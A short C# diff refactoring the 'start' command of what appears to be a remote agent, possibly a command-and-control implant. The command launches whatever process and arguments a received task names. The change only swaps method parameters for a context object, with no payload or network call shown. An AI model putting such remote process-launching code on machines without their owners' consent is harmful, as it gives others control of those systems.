@@ -11,12 +11,12 @@ namespace Agent.Commands
     public class StartCommand : AgentCommand
     {
         public override string Name => "start";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
+        public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
             var filename = task.SplittedArgs[0];
             string args = task.Arguments.Substring(filename.Length, task.Arguments.Length - filename.Length).Trim();
             Executor.StartCommand(filename, args);
-            result.Result = "Process started";
+            context.Result.Result = "Process started";
         }
     }
 }
